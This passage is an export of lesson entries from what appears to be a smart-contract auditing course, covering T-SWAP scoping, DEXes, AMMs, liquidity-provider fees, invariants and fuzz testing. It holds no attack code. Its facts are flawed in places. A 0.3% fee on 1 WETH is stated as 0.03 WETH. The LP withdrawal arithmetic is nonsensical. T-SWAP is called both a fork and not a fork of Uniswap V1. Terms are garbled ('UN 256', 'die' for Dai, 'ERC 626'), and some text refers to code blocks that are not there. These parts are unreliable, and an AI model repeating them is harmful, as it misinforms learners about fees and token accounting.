          On a regular audit, we'd swap branches to the commit hash to ensure we're working on an identical codebase through the command `git checkout "[paste commit hash here]"`. In this tutorial, however, we'll stick with the main branch.

          ## Checking Codebase Size and Interactions

          Our TSWAP repository has two contracts in scope: Pool Factory and TSWAP. A scroll through the SRC shows that these are the only contracts in action, with a SLOC (Source Lines of Code) of 374. This figure, being double the size of our previous Puppy Raffle review, gives us a mental image of review duration based on code length and complexity.

          We head into uncharted waters with a crucial question: How many external protocols does the code interact with? Though new to this discourse, you'll discover the answer's importance in due course.

          ## Test Coverage: A Total Nightmare

          A cursory look at the test coverage (a dismal 41%) sets off alarm bells. By delving into the README file and running `make` on our command-line interface‚Äîwatching as it triggers installations‚Äîwe can see the extent of the test coverage‚Äîthe bedrock of any software project.

          ![](https://cdn.videotap.com/CsI8uiOgGgscAECYBaRW-297.16.png)After a round of `forge coverage`, we cringe at the test coverage results. A low coverage figure, such as the 40% and 37% for functions and branches respectively that we are staring at, is a bright red flag for bugs galore!

          Once this alarming discovery is made, we must revert to the main branch using the commands `git stash` and `git checkout main`. We must also run `make` to commence another series of installations.

          No sooner are these installations done that we return to business‚Äîour comprehensive onboarding documentation.

          ## Scope, Scope File and Building Protocol Context

          Our review scope is now clear: the Pool Factory and TSWAP. With commands `make scope`, and `make scope file` we generate an output and file that are incredibly compatible with pandoc‚Äîa documentation generation tool we love.

          Now that the scope is clarified, we delve deeper into protocol understanding. Here, we ask questions like whether the project is a fork of an existing protocol, or if it uses rollups. Such queries, though seemingly unrelated to the immediate task, bear great significance later in the course.

          In our case, our protocol is a new standalone rather than a fork of an existing one (Uniswap V1 for this instance). It doesn't use rollups or have multi-chain functionalities. It operates exclusively on Ethereum, sans the use of oracles or zero-knowledge proofs. It does interact with ERC20 tokens though, a factor you will get a clear understanding of once we delve into the protocol explanation.

          ## More Onboarding Questions

          During protocol onboarding, it's essential to engage in a deep and meaningful conversation with the protocol team about protocol risks. Questions about rogue protocol admin capturing fees, inflationary deflationary ERC20, fiat transfer tokens, and rebasing tokens will often receive dismissive or uninformed responses.

          Protocols will often deny known issues or prior audits, as seen in our onboarding document. These points, however, form a vital part of building context resources, hence their import.

          The README file plays a crucial role in this process but often falls short in providing adequate information. At this point, you'd reach out to the protocol team requesting walkthroughs, explainer videos, charts, or even a blog post‚Äîanything to build up an adequate information base.

          Remember, the developers of a protocol always possess more context than you'll ever get from code alone. Thus, asking them questions will accelerate your understanding. While it's critical to trudge through the codebase independently, reaching out when stuck can lead to faster solutions.

          Notwithstanding, remember to use the protocol team's time wisely and avoid asking basic questions like "what's UN 256". Your questions should reflect a deep understanding of the protocol and be geared towards obtaining further understanding.

          ## Wrapping Up

          Our extensive onboarding not only prompts critical questions but also provides ready answers where possible. Obtaining answers to 'rec test' questions and understanding their post-deployment plans is easier when conducting a private audit. However, in a competitive audit setting, this information might not come as readily.

          In summary, this T-SWAP audit tutorial shows just how comprehensive and detailed a security review can be. From cloning repositories and capturing enormous amounts of data to conversing with the protocol team about potential risks‚Äîevery stage carries its weight of importance. So, buckle up, ask questions, and dig into those reviews with gusto!

          Keep an eye on this space, and let's explore more interesting protocols next time.
        description: 'Beginning our scoping phase of TSwap a fork of Uniswap V1.'
      -
        id: cc17642d-b651-4008-9c54-9c65032f9a91
        type: new_lesson
        enabled: true
        title: 'Primer On This Review'
        slug: primer-on-this-review
        duration: 2
        video_url: rzFEOWoy8eg9xa00fEWpB269vMtyoClvuA6J597rvY00k
        raw_markdown_url: /routes/security/5-tswap/3-primer-on-this-review/+page.md
        markdown_content: |-
          ---
          title: Primer on This Specific Review
          ---

          _Follow along with this video:_



          ---

          Welcome, committed developers! If you've successfully traversed the onboarding phase of your latest project, not without its fair share of glitches, but overall a positive experience, let's now sail into the realms of uncharted territory. Here's where we dig deeper into documentation and imbibe the magic potion of protocol invariants. Sound unfathomable? Stay hooked!

          _"Understanding a protocol's invariants is as crucial as security review itself, and it's possible to do one without opening any code."_

          So buckle up for an intriguing journey of dissecting documentation, decoding protocol invariants, and their role in devising robust test suites.

          ## **Unveiling Documentation**

          Documentation serves as a treasure trove of virtues to get a deeper understanding of the codebase. Let's take a tour of the pertinent areas that call for focus and elaboration. Crystal clear documentation eases the complex process of security review, but‚Äîto our dismay‚Äîthat's not always the case.

          At times, documentation may not do absolute justice in illustrating intricate processes or mechanisms. For these instances, we need to bolster comprehension using self-explanatory diagrams and choreographed video lessons.

          ## **Impact of Base Protocols: Case of Uniswap**

          Our discussion takes a fascinating turn as we move onto the trading phenomenon of decentralized exchanges. The protocol under our scanner, TSwap, derives its inspiration from the Uniswap Protocol.

          ![](https://cdn.videotap.com/40hr7aunyYjpIPhaqrYe-49.68.png)

          [Learn more about Uniswap here](https://docs.uniswap.org/)

          By analyzing TSwap, you inadvertently learn a great deal about Uniswap. It will unveil underlying concepts such as Automated Market Makers (AMMs) and decentralized exchanges.

          The significance of comprehending these principles becomes the focal point when conducting a _Decentralized Finance (DeFi) Security Review_. The term "Raffle," if familiar, would sound synonymous in this context. The rule of thumb? Know about raffles if dealing with a raffle, understand decentralized exchange when handling a decentralized exchange!

          ## **Exploring Protocol Invariants**

          Now, before plunging into the nitty-gritty of devising foolproof test suites, let's lay the groundwork and comprehend _protocol invariants_.

          Protocol invariants typically refer to properties in a system that remain unchanged irrespective of the sequence of operations. Essentially, during the security review of a codebase, it's vital to define and verify the protocol invariants.

          ## **Testing the Waters: Prepping for Test Suites**

          In the world of coding, defining and understanding protocol invariants occupies a paramount position before the creation of test suites. It devolves chaos into order, aligns our vision, and sets into motion a trajectory that ultimately leads us to the wonderland of our retrieved goal.

          To sum up, navigating the labyrinth of code security review gets simpler if you devote sufficient time understanding the nuances of documentation, the influence of base protocols and the pivotal role of protocol invariants before crafting test suites.

          In the words of a seasoned developer,

          > "Understanding the precepts before jumping into action can make the journey less cumbersome and the destination more rewarding."

          So let's make that journey, let's begin the rewarding read and understanding the documentation.
        description: 'Learn about protocol invariance without code. Study DEXs & DeFi Security Reviews. Explore TSWAP Protocol Docs w/ Diagrams & Videos.'
      -
        id: 50ec6e20-7dd2-4a15-954f-67be45ea239d
        type: new_lesson
        enabled: true
        title: 'What is a DEX?'
        slug: what-is-a-dex
        duration: 3
        video_url: tYZiE4cU00JTzVmBoQ02bvni00M4S5onYqGkTQLTLHOraA
        raw_markdown_url: /routes/security/5-tswap/4-what-is-a-dex/+page.md
        markdown_content: |-
          ---
          title: What is a DEX?
          ---

          _Follow along with this video:_



          ---

          # The Ultimate Guide To T-SWAP &amp; Decentralized Exchanges

          ## Getting Started

          Are you familiar with the concept of decentralized exchanges or DEXes? Well, T-SWAP is a promising project and an upcoming player in this space. T-SWAP is meant to be a permissionless way for users to swap assets between each other at a fair price. What else does T-SWAP aim to do, you ask? Well, let's unravel its offerings.

          ## The T-SWAP in a Nutshell

          Imagine you're a user with ten USDC (a stablecoin pegged to the US dollar) and you want to buy WETH (Wrapped Ether, an ERC20 equivalent of Ethereum). T-SWAP essentially allows for this transaction to occur. In simple terms, a user starts with ten USDC and zero WETH, use T-SWAP to make a swap, and they will end with zero USDC and some WETH.

          You can think of T-SWAP as a decentralized asset token exchange similar to popular platforms such as Coinbase or Robinhood. But it's not just another cryptocurrency exchange, it is powered by the concept of decentralization, offering a cutting-edge alternative to traditional exchanges.

          ![](https://cdn.videotap.com/iTNZThQG62yyusiLZJVT-35.77.png)

          ## Diving into Decentralized Exchanges (DEXes)

          A quick visit to DeFi llama, a popular site that tracks decentralized finance protocols, will give you an idea about the variety of DEXes in the market. From Uniswap, Curve, Balancer to SushiSwap, each of these platforms have unique code bases and different pros and cons.

          > "DEXes are a revolutionary approach to asset exchange, veering from the centralised norm and offering an autonomous, often peer-to-peer, trading experience."

          T-SWAP, much like many of these exchanges, is also classified as an Automated Market Maker (AMM). If you are confused or intrigued at this point, don't sweat it. Here is an article on Chainlink Labs that provides a detailed walk-through of the AMM concept.

          ## Introducing Automated Market Makers (AMM)

          Decentralized exchanges such as T-SWAP operate differently from traditional order book exchanges. This is where the concept of AMMs comes in. It makes use of asset pools rather than an order book for asset exchange.

          Remember, diving into the world of DEXes and AMMs can initially be challenging, but also immensely rewarding. So take the plunge, and happy learning!
        description: 'Decentralized exchanges explained through Uniswap and TSwap'
      -
        id: dea61563-14e6-4c88-935e-4cbdc977f46a
        type: new_lesson
        enabled: true
        title: 'What is an AMM?'
        slug: what-is-amm
        duration: 10
        video_url: hcaTWeWr7FV6DhzTW35q6500rQOmqIeA2RPaSVvjiWvw
        raw_markdown_url: /routes/security/5-tswap/5-what-is-amm/+page.md
        markdown_content: |-
          ---
          title: What is an AMM & How AMM works?
          ---

          _Follow along with this video:_



          ---

          # Understanding Automated Market Makers: A Deep Dive into Decentralized Finance

          Decentralized finance is gaining popularity as the world turns towards blockchain technologies for secure, transparent financial transactions. Central to DeFi's attraction is the Automated Market Maker (AMM), a unique trading model that is reshaping our understanding of trading mechanisms. However, to grasp this concept effectively, let's first refresh our understanding of the traditional order book style of exchange.

          ## The Traditional Order Book Style of Exchange

          Imagine that you want to trade on Coinbase or Robinhood. Here's what that process might look like:

          1. You come to the exchange and say, "Hey, I want one WETH (Wrapped Ethereum) for ten USDC.‚Äù
          2. You place an order that goes onto what's known as an 'order book.'
          3. Another user sees your trade and decides they're interested.

          If the other user has one WETH and zero USDC, they might think your trade is reasonable and decide to take it. The system identifies these matched orders and facilitates the exchange. User A gives ten USDC to the system, which gives it to User B, and vice versa.

          This model is commonly used by large, centralized exchanges; however, it does present a few challenges:

          - Every exchange transaction using Ethereum costs 'gas' (i.e., the cost of computation). This can rack up significant costs for users and could potentially deter people from using the platform.
          - With this style of exchange, a lot of computation work occurs behind the scenes. This complexity can hinder its full implementation on a decentralized platform like Ethereum.

          So, knowing these limitations, Ethereum decided on an alternate approach.

          ![](https://cdn.videotap.com/e4EULmEIKYejqgjYxvO4-189.76.png)

          ## Enter the Automated Market Maker

          Rather than placing orders and matching them as in an order book exchange, an AMM operates on the principle of liquidity pools.

          Let's visualize this using an example:

          1. Assume two giant pools of money or 'liquidity pools' exist ‚Äî one with 100 WETH and the other with 1000 USDC.
          2. User A wishes to buy one WETH with his ten USDC.

          At this stage, a specific mathematical function comes into play:

          - The system calculates the ratio of WETH to USDC in the pools which is 1000 USDC / 100 WETH = 10.
          - So, the 'mock price,' as we are calling it, is 1 WETH = 10 USDC.

          Now, if User A wants to take one WETH out of the pool, he must ensure the correct ratio is maintained. So he puts ten USDC into the USDC pool, and only then can he take out one WETH.

          ![](https://cdn.videotap.com/NDFbEb030FC4DlLUCFdR-355.8.png)

          This alters the ratio in the pools. There are now 1010 USDC and 99 WETH. Recalculating, we see the ratio is now 1010/99 = 10.2. One WETH now amounts to 10.2 USDC - an increase of 0.2 USDC from the last transaction. By simply completing the transaction, User A has managed to move the market and change the price of WETH. This essentially resembles market dynamics breath the concept of supply and demand; as demand for an asset increases, so does its price, and vice versa.

          ![](https://cdn.videotap.com/csLNwV1pl8cFQGODANry-379.52.png)

          This same principle applies when User B wants to trade. They can keep changing the ratios by adding or subtracting amounts in these pools to trade their preferred amount, given that the ratio always is maintained. This AMM model is known as a 'constant product market maker,' a type of AMM that maintains a constant product of the quantities of the two assets.

          The following code block presents an example of how this might be implemented programmatically:

          This demonstrates how an AMM operates in a simple and efficient manner, bypassing the traditional challenges of an order book model. But, it is important to remember that this simple example doesn't capture the complexity and potential risks associated with real-world AMMs.

          AMMs are just one aspect of DeFi that is pushing the boundaries of what is possible in finance, allowing individuals to gain control over their financial interactions. However, it‚Äôs crucial to understand that, like any financial system, it comes with its own set of risks and challenges. Remember, your capital is always at risk when investing.

          _‚ÄúThe fascination of DeFi lies in the infinite possibilities it brings to the world of finance, pushing boundaries and creating opportunities.‚Äù_
        description: "We're walked through what an AMM is and how it works in DeFi."
      -
        id: 08b67262-6849-4a51-b128-5a890f5b25a5
        type: new_lesson
        enabled: true
        title: 'Liquidity Providers'
        slug: liquidity-providers
        duration: 11
        video_url: omJrL01ykVB5zgQ5UYnNeZBtMWtHpHuB2TonfBkOZmN4
        raw_markdown_url: /routes/security/5-tswap/6-liquidity-providers/+page.md
        markdown_content: |-
          ---
          title: Liquidity Providers - Why AMMs have Fees?
          ---



          ---

          # Untangling Decentralized Finance: Understanding Automated Market Makers (AMMs)

          Welcome back to our deep-dive into the bustling world of decentralized finance. Today, we're unraveling the complexity of Automated Market Makers (AMMs) like Uniswap and Sushiswap, explaining how they facilitate trades and generate fees for liquidity providers. Let's get started!

          ## What Makes An AMM Work?

          The heart of an AMM like Uniswap resides in its liquidity pools. For simplicity, let's take an imaginary pool that contains 1000 USDC (United States Digital Coin) and 100 WETH (Wrapped Ether). This pool facilitates trades: for instance, someone could exchange 10 USDC for 1 WETH.

          But there's more to it: after the trade, there's a new balance in the pool. With one WETH taken out and 10 USDC added, we now have 1010 USDC and 99 WETH.

          IMPORTANT: Remember, almost all AMMs also extract a small fee for each transaction, say, 0.3%. So, to trade 1 WETH, one might actually need to send 1.03 WETH, with the 0.03 WETH fee either going to its designated spot or staying within the pool.

          Now, you might be wondering if there's a loophole that allows you to make infinite money by continuously trading, but allow us to dash your dreams. AMMs have mathematical safeguards in place to prevent such abuse.

          ## The Role Of Liquidity Providers

          Who funds these pools full of digital currencies, you ask? Enter the Liquidity Providers (LPs), the unsung heroes of the AMM system. They supply the assets to the protocol so individuals can perform swaps.

          When an LP adds their funds - for example, 1000 USDC and 100 WETH - they gain ownership of the pool equivalent to their share of total funds, which is represented by Liquidity Provider Tokens (LP Tokens).

          So, by investing their assets into the protocol, LPs not only gain ownership but also earn a share of the transaction fees generated from the trades.

          ## More About LP Tokens And Fees

          Let's investigate further into the LP Tokens and their relationship with fees. Say, a new liquidity provider, C, enters the pool with half of what A and B initially put in, essentially 500 USDC and 50 WETH. This, in turn, increases the total assets in the pool to 2500 USDC and 250 WETH.

          In return for their contribution, liquidity provider C receives LP tokens. How many?

          Well, we can calculate that by taking the ratio of the funds they've added to the total funds, in this case, 0.2 (or 20%). Multiplying this by the total LP Tokens, we deduce that liquidity provider C will receive 50 LP Tokens, granted their contribution.

          Consequently, we now have a total of 250 LP Tokens in circulation. At this juncture, we also have a pool of 2500 USDC and 250 WETH ready for trades.

          ## How Fees Make Money For Liquidity Providers

          The burning question now is: How do liquidity providers make profits? The answer lies with the transaction fees mentioned earlier.

          Every trade results in a fee that slightly adjusts the ratio of assets in the pool. For instance, if a user trades 10 USDC for 1 WETH, they're also charged a fee (0.3 USDC in our example), which changes the pool balances to 2510.3 USDC and 249 WETH.

          When a liquidity provider chooses to withdraw their funds, they can redeem their LP tokens for an amount of each pool asset proportional to their LP tokens. So, if Liquidity Provider C withdraws their 50 LP Tokens (representing a 20% stake), they'll get back their original investment plus their earned fees.

          Let's crunch some numbers:

          ```markdown
          # Assuming 1 WETH is equivalent to 10 USDC

          # Initial Deposit: 500 USDC and 50 WETH

          # Amount Withdrawn: 502.6 USDC and 49.8 WETH

          # Equivalent to: 498 USDC + 502.6 USDC = 1000.6 USDC

          # Profit: 1000.6 USDC - 1000 USDC = 0.6 USDC
          ```

          It's by these accruing transaction fees that liquidity providers gain returns on their investments. The more trades executed, the more fees generated and the more money they make, providing an explanation regarding why so many are lured towards becoming liquidity providers.

          ## Wrapping Up

          At a high level, this is the underlying mechanism of an automated market maker like Uniswap. It might seem complex or counterintuitive at first, especially given the novel concepts and the involvement of mathematical models. But with some involvement and time, I assure you, it all starts making more intrinsic sense.

          In the end, it's about providing liquidity, facilitating exchanges, and earning fees - all in a decentralized manner on the blockchain.

          > "Decentralized finance might seem mesmerising at first, but when you dive into it, you realize it's all about providing liquidity, facilitating exchanges, and earning rewards ‚Äì all in a decentralized way on the blockchain."

          Stay tuned for more deep-dives into the ever-evolving world of decentralized finance!
        description: 'An explanation on liquidity providers and the sources of AMM fees for traders.'
      -
        id: 3a439ac2-6269-4ca3-9152-8fc65b99a683
        type: new_lesson
        enabled: true
        title: 'How AMMs Work'
        slug: how-amms-work
        duration: 5
        video_url: zJAJSEA014rfj6VNwcIbCRic01jhR8bDsVk4wCZ3vvBjA
        raw_markdown_url: /routes/security/5-tswap/7-how-amms-work/+page.md
        markdown_content: |-
          ---
          title: How AMMs Work Recap
          ---



          ---

          # Understanding Automated Market Makers, T-SWAP and Uniswap

          Cramming a ton of concepts into one learning session can be overwhelming. But let's decode the concepts of T-SWAP or Uniswap, and how Automated Market Makers (AMMs) operate and differ from traditional order books.

          ## Reviewing Traditional Order Books

          In typical exchanges, a user may propose a trade, for instance, as wanting 1 ETH for 10 USDC. This proposal gets placed into an order book. Users are then able to propose their own trades or to accept others' proposals. This method is how a traditional centralized exchange operates, using the order book methodology.

          Here's a basic example:

          > \[ User1: TRADE PROPOSAL ‚Äî 1 ETH for 10 USDC \]

          However, a lot happens behind the scenes in this model. Orders are being matched, and with an extensive list of orders in their order books, this process can be highly gas-consuming, involving multiple transactions on the centralized exchange.

          **IMAGES HERE**

          The challenge with decentralized finance (DeFi) is this model's costs. If many transactions lead to significant gas spending and if you have to wait for someone to accept your trade, it could take quite a few blocks. So, the question is ‚Äî how can we manage costs and keep trading to one transaction?

          ## Introducing Automated Market Makers (AMMs)

          Enter AMMs, a solution to the above problems. Instead of an order book, we work with giant pools of money and utilize the ratio between these pools as the assets' price. To take money out of one pile, you need to put equivalent ratio into the other pile. This concept is known as the AMM, more specifically, the constant product market maker or constant product formula.

          Also, each swap that users make on their smart contract collects an added fee. These fees incentive people to create and contribute to these money pools as liquidity providers actually make profit from these accumulated fees with more trades people make.

          ## Understanding T-swap and Uniswap

          Both [Uniswap](https://uniswap.org/) and T-swap use the AMM model. Uniswap, for instance, has gone through several iterations (v1, v2, v3 with v4 currently in progress), each slightly different but fundamentally based on the AMM's principles.

          When learning a protocol, consider taking a hands-on approach. Connect to the protocol through a secure wallet and test out transactions.

          > **NOTE:** The 'Discussions' tab, Piranha IO, the Ethereum Stack Exchange, Discord, and Telegram are invaluable resources for understanding novel solutions that developers and protocol creators are cooking up. Get comfortable asking questions, especially when conducting a private audit.

          With time, the process becomes more navigable, allowing you to understand the protocols and begin tinkering with the code.

          ## Building Context and Better Understanding AMMs

          Let's explore further. If unclear, don't sweat it. It's okay to not get everything right away ‚Äî continue to ask questions and gradually everything will fall into place.

          Browse through the Git repo associated with the current section, go to the audit data branch, and take a good look at the accompanying diagrams. They will offer a good visual understanding of how these concepts interlock.

          To better understand AMMs and keep up with the evolving world of DeFi, keep probing, keep asking questions, keep building context. No one method is a silver bullet ‚Äî the best way to learn is the way that works for you.

          > "The more you work with it, the more sense it'll make."
        description: 'Patrick further details AMMs and how they function in this quick review on How AMMs Work.'
      -
        id: 82992418-cc58-44f2-834d-3a3450284f54
        type: new_lesson
        enabled: true
        title: 'TSwap Recon Continued'
        slug: t-swap-recon-continued
        duration: 3
        video_url: knE1hhvNNInu6UDaUpUcB009IRMz801so7fgDECNZuq1U
        raw_markdown_url: /routes/security/5-tswap/8-t-swap-recon-continued/+page.md
        markdown_content: |-
          ---
          title: T-SWAP Recon Continued
          ---



          ---

          # Decoding the AMM Swapping Process using Pool Factory Contracts

          In our last conversation, we delved into the complexities of the AMM (Automated Market Maker) swapping process. This blog post builds on that foundation, unravelling other critical sections and explaining how a pool factory contract fits into the picture.

          ![](https://cdn.videotap.com/KhZyFmTzPcrusQqCBOsj-8.05.png)

          ## Diving into a Pool Factory Contract

          At its core, the protocol begins as a pool factory contract, which you can use to create new pools of tokens. Glancing through the audit data branch, you'll notice the `poolfactory.sol` that includes this `Create Pool` function. This function is responsible for forming these AMM pools, hallmarking a major component of our swapping process.

          ```js
          function createPool(address tokenA, address tokenB) external returns (address pool) {
              // ...
              return pool;
          }
          ```

          Made it more evident, when we zoom into the `poolfactory.sol`, it's seen that various token pairs can be created. For instance, there's a USDC WETH pool being created with the `Create Pool` function. Yes! You just don't create pools; it's also about combining different token pairs to form these pools.

          ## Understanding the Logic behind Pool Contract

          The contract used to create new pools ensures that each pool token adheres to the correct logic. Nonetheless, the real allure of these pool contracts comes alive with each T swap pool contract.

          To highlight this point, I navigated the SRC, where I found the `create pool` function in play (highlighted in the `poolfactory.sol`). This function sprung my curiosity, and I began exploring it more.

          To my delight, I discovered that the function seemingly calls this new TSWAP pool function. Though information-dense, the sequence makes sense as the `Create Pool` function is being called to create a new pool contract.

          After investing some time into exploring the process, I realized that each TSWAP contract operates as an exclusive exchange between two specific assets, as originally depicted in our early diagram with ne ERC 20 and the WETH token.

          ## Bridging the Gap via Pools and WETH

          The magic of WETH lies in its ability to specifically provide pools with the power to allow users to freely swap between an ERC 20 having a pool and WETH (Wrapped Ether). With a sufficient number of pools created, they enable an easy hop between supportive ERC 20s.

          If this sounds like a challenge, consider this; if I possess USDC, I could swap from USDC to WETH. Then, switching from WETH to Link becomes feasible because there's likely going to be a USDC WETH pool and a Link WETH pool.

          Now, let‚Äôs explain the process with an easy example,

          > User A has ten USDC. They want to swap it for die. So, they swap their ten USDC for WETH in the USDC WETH pool. They then swap their WETH for die in the Dai WETH pool.

          It falls into place now, doesn't it? Every pool designates a unique pair between some tokens and WETH. Not only does it provide functionality for swapping but also gives developers insight into the two functions enabling the swap process.

          At the higher level, this is how swapping works, and playing around with the sample codes will only enrich your understanding of the process.

          ## Role of Liquidity Providers

          Hopefully, this article provided you with useful insights into the process of pool creation, swapping, and the essence of LPs. However, there's much more to explore and understand, and it's fascinating to see how these different components intricately work together to enable seamless AMMs.
        description: 'TSwap - Create New Pools, Swap Tokens via Multiple Pools, Liquidity Providers.'
      -
        id: 7e94a8f8-45d8-4500-a442-c6405637fc5c
        type: new_lesson
        enabled: true
        title: 'Invariant & Properties Introduction'
        slug: 'invariant-&-properties-introduction'
        duration: 3
        video_url: IDlcJVI801yE5cL00TjoLILVMQ6N02pSVHht8c4HyzMbN4
        raw_markdown_url: '/routes/security/5-tswap/9-invariant-&-properties-introduction/+page.md'
        markdown_content: |-
          ---
          title: Invariant & Properties Introduction
          ---



          ---

          # Demystifying Core Invariants in Blockchain Protocols

          Diving deep into the world of Blockchain, I thought to explore something fundamental yet intriguing: the concept of **invariants**. Invariants form the bedrock of most blockchain protocols, a feature you will encounter in almost every protocol ranging from ERC 20s to ERC 721s. Understanding this critical element is vital for anyone looking into the inner workings of these protocols.

          In this blog, we'll cover invariants thoroughly while also touching on how to inspect them properly. We'll hope to do so by investigating the TSWAP protocol and its core invariant. Create a hot beverage, loosen up, and let‚Äôs probe these invariants together!

          ## What are Protocol Invariants?

          Invariants, in blockchain terms, are properties or conditions within a system that remain unaltered regardless of the actions carried out within the system. They are dynamic rules ensuring the system's safety, and they play a pivotal role in designing tokens in blockchain protocols.

          For instance, various types of tokens like ERC 20, ERC 721, or ERC 626 have numerous invariants to their names. Each ERC 20 has 20 properties or invariants while an ERC 721 has 19. As you'll discover later in this course, ERC 626 tokens, which we'll cover in the _Vault Guardians_ section, boast of whopping 37 properties.

          To get a hang of these properties, you can pay a visit [here](https://blog.trailofbits.com/2023/10/05/introducing-invariant-development-as-a-service/), at the _Trail of Bits repository_. This repository neatly lays out the invariants of an array of tokens.

          ## TSWAP Protocol and Invariants

          Now, let's turn our gaze towards the TSWAP protocol. If you explore the protocol, you'll encounter the gift the developers have graciously provided: the core invariant.

          However, it's noteworthy to understand that sometimes developers may not correctly establish the invariant. In such cases, the onus falls on us, the _Security Experts_, to ensure accuracy. While the developers hand you the necessary details, understanding and breaking down the invariants becomes a task of paramount importance.

          Unfortunately, many developers do not fully grasp their own created invariants. Bearing this in mind, you might come across instances where you need to discern the invariants by referring to the documentation. Therefore, it's crucial for every developer to understand invariants better or properties.

          ## Invariants and Fuzz Testing

          As we've already laid some groundwork on invariants, let's now head towards a deeper understanding of them by considering fuzz testing.

          > ‚ÄúFuzz testing or fuzzing is a method for discovering coding errors and security loopholes in software, networks, or operating systems by inputting massive amounts of random data to the system in an attempt to make it crash.‚Äù

          I've brought together a series of fuzz testing videos which we will delve into dipping our toes into the in-depth understanding of invariants and fuzzing.

          But before that, if you are an alumnus of the **Foundry Course**, you may already have a basic understanding of fuzzing. Nevertheless, a refresher would surely help as we dig deeper into the concept with a more in-depth pedagogical approach.

          In the next phase, we will examine a quick informative video to enhance our understanding of invariants and the varied tactics to evaluate them, with a specific focus on fuzz testing.

          Buckle up, recalibrate your focus, and let‚Äôs take this enlightening journey on understanding the invariances better. After all, there's no better time to learn something new than right now. Stay curious!
        description: 'In-depth explanation of blockchain protocol invariants and fuzz testing. Examples from ERC-20 & ERC-721 tokens.'
      -
        id: cfdd384a-8605-435d-a4e6-54a8423bfef7
        type: new_lesson
        enabled: true
        title: 'Stateful And Stateless Fuzzing'
        slug: stateful-and-stateless-fuzzing
        duration: 10
        video_url: xQx6cWAYc7smFlIS800iYrTKmzFNeI0252UZoX8usT2tY
        raw_markdown_url: /routes/security/5-tswap/10-stateful-and-stateless-fuzzing/+page.md
        markdown_content: |-
          ---
          title: Stateful and Stateless Fuzzing to Test Invariants
          ---



          ---

          # Mastering Fuzz Testing to Secure Your Code

          Ah, contracts written, tests conducted ‚Äî time to ship your code, right?

          Wrong.

          ![](https://cdn.videotap.com/tSLOq12UEqMlEKM1ZYUu-34.65.png)

          The answer is a straightforward no, as your code can easily fall prey to a flash loan attack. This post will guide you through the complex but fascinating world of Fuzz Testing and how it can help you safeguard your code from unexpected exploits.

          ## The Notorious Flash Loan Attack

          In essence, a flash loan attack could jeopardize your whole system, regardless of how well you've written or tested your code. As intriguing as it may sound, this breach results from already prepared and unthought-of scenarios that lack appropriate tests.

          > "Most of the time, hacks will come from a scenario that you didn't think about or write a test for."

          ## Enter: Fuzz Testing

          Fuzz testing (also known as fuzzing) is a robust fix to cope with these random yet deadly exploits. It involves supplying random data to your system with an aim to break it ‚Äî just like relentlessly trying to pop a balloon until it finally gives in, serving as a metaphor for our system code here.

          Sounds a bit odd, huh? Why would we want to break our own system?

          ![](https://cdn.videotap.com/EkFB4lChiHAsfS8axMsP-150.16.png)

          Glad you asked. Here's where the concept of invariants or properties of a system come into play. These are the untouchable rules or the inviolable conditions in our system that should always hold true. For instance, in a function that mandates our variable outcome to always be zero, this condition would be our invariant.

          ## Testing: Unit Test vs. Fuzz Test

          Consider our function called `doStuff` which accepts an integer as an input parameter and promises to always return zero.

          This code passes a single data point, calls the function and then asserts that the variable `shouldAlwaysBeZero` is indeed zero. With such a test, our function seems to be covered for the given data input.

          ### - Fuzz Test:

          However, what if the data input is different? What if it‚Äôs two, causing `shouldAlwaysBeZero` to become one and thereby breaking our invariant?

          In this Fuzz test, we replace the manually selected data in the original unit test parameter with randomized data (commenting out the previous line of code). When you run a test here, the program will automatically randomize the data, resulting in different examples.

          Running the aforementioned unit test will pass, but running the equivalent Fuzz test will actually highlight where our system fails. It'll show an output where it says "assertion violated" and provide the data and arguments that caused the fail, all by randomly throwing data at our function.

          That said, it's important to understand that Fuzzers won‚Äôt cover every single possible input, hence, understanding how your Fuzzers pick the random data is a crucial skill to develop.

          ## Moving on to Stateful Fuzzing

          A Fuzz test is usually a stateless fuzz test, meaning the state of the previous run is discarded for the next run. However, in some cases like our example, we need the outcome of the previous run to influence the next one. For this, we bring in Stateful Fuzzing.

          Stateful Fuzzing is where the ending state of our previous fuzz run is the starting state of the next fuzz run. For example, instead of creating a new instance of our contract for each test run, we use the same contract and perform multiple operations on it.

          We can use Foundry's invariant keyword to perform stateful fuzzing, but first, we need to import the `STD invariant` contract, let Foundry know which contract to call random functions on, and then, write our invariant.

          Upon running this test, we will finally discover a sequence where our assertion fails, providing us with the information to adjust our code accordingly.

          While fuzzing with Foundry, an important distinction to keep in mind is between fuzzing or stateless fuzzing and invariants or stateful fuzzing.

          ## Embedding Fuzz Testing into Your Routine

          In a real-world setting, your invariant might not be as simple as our example. It could look something like ensuring new tokens minted are less than the inflation rate or creating a lottery game where there should only be one winner. Although fuzz testing isn't a substitute for expert manual review, it is certainly a critical tool to thwart vulnerabilities in your code.

          Finally, we hope you've gained a solid knowledge of the basics of fuzz testing. Fear not, you're not alone in your journey. At [cyfrin](https://www.cyfrin.io/), we use invariants during our audits to identify vulnerabilities that are frequently difficult to catch purely with manual reviews.

          Stay tuned for our next post where we'll delve into the advanced fuzzing techniques and help you become a fuzzing pro. Together, let's strive to make Web 3.0 even better! Happy coding!
        description: 'Patrick details the differences between stateful and stateless fuzz testing and how each can be used to break protocol invariants.'
      -
        id: 453797a9-269f-4b55-a04d-42e759298e40
        type: new_lesson
        enabled: true
        title: 'Stateless And Stateful Fuzzing Practice'
        slug: stateless-and-stateful-fuzzing-practice
        duration: 5
        video_url: WFMFpiMv02tkF01CdWAlHn01gtmJ101oQmD9MLr003LxkC68
        raw_markdown_url: /routes/security/5-tswap/11-stateless-and-stateful-fuzzing-practice/+page.md
        markdown_content: |-
          ---
          title: Stateless and Stateful Fuzzing Practice Introduction
          ---



          ---

          # Proficiency in Invariant Tests and Fuzzing Tests: Professional Insights and Practicum

          Hello everyone, today we delve deeper into the intriguing world of invariant tests and fuzzing tests. Buckle up as we gear up to break some contracts by exploring these tests, intentionally leaving the code unexamined for now. Our curiosity piqued? Let‚Äôs get into it!

          ## Diving into Code Bases

          We can‚Äôt help but sneak a peek into the code now, can we? Since we are here, let's analyze this exemplary TSWAP pool code base.

          ![](https://cdn.videotap.com/9DXkrFHNdYGt3CJIJuAh-39.png)

          It's filled with a plethora of comments, functions, and other intricate elements - it's enough to make the most seasoned of us a tad bit overwhelmed. Amongst us is the pool factory that stands minimal. We notice that the primary responsibility of pool factory is to create pool functions. Isn‚Äôt it interesting to note the stark contrast between TWSAP pool code base and pool factory?

          ## What About the Security Review Test?

